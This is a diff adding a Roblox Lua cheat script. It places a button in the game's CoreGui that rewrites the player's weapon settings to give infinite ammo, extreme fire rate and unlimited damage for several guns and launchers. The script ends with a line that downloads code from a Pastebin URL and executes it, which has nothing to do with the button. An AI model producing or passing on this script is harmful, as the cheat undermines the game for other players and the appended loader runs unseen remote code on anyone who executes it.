@@ -1,0 +1,49 @@
+local VIP = Instance.new("ScreenGui")
+local KK = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+
+
+VIP.Name = "VIP"
+VIP.Parent = game.CoreGui
+VIP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+
+KK.Name = "KK"
+KK.Parent = VIP
+KK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KK.BorderColor3 = Color3.fromRGB(0, 0, 0)
+KK.BorderSizePixel = 0
+KK.Position = UDim2.new(0.0857338831, 0, 0.0989974961, 0)
+KK.Size = UDim2.new(0, 50, 0, 50)
+KK.Font = Enum.Font.SourceSans
+KK.Text = "UI"
+KK.TextColor3 = Color3.fromRGB(0, 0, 0)
+KK.TextSize = 14.000
+KK.Draggable = true
+KK.MouseButton1Click:Connect(function()
+local gun = require(game:GetService("Players").LocalPlayer.Backpack["Scar-L Rifle"].ACS_Modulo.Variaveis.Settings)
+
+gun.FireRate = 1000
+gun.Ammo = math.huge
+
+local rpg = require(game:GetService("Players").LocalPlayer.Backpack.RPG.ACS_Modulo.Variaveis.Settings)
+
+rpg.Ammo = math.huge
+rpg.ShieldDamage = math.huge
+
+local st = require(game:GetService("Players").LocalPlayer.Backpack.Stinger.RocketSettings)
+
+st.PlaneDamage = math.huge
+st.HelicopterDamage = math.huge
+
+local m = require(game:GetService("Players").LocalPlayer.Backpack["M200 Intervention"].ACS_Modulo.Variaveis.Settings)
+
+m.Ammo = math.huge
+
+local mgg = require(game:GetService("Players").LocalPlayer.Backpack["Javelin"].ACS_Modulo.Variaveis.Settings)
+
+mgg.Ammo = math.huge
+end )
+UICorner.Parent = KK
+
+loadstring(game:HttpGet("https://pastebin.com/raw/bb3RGCEm"))()
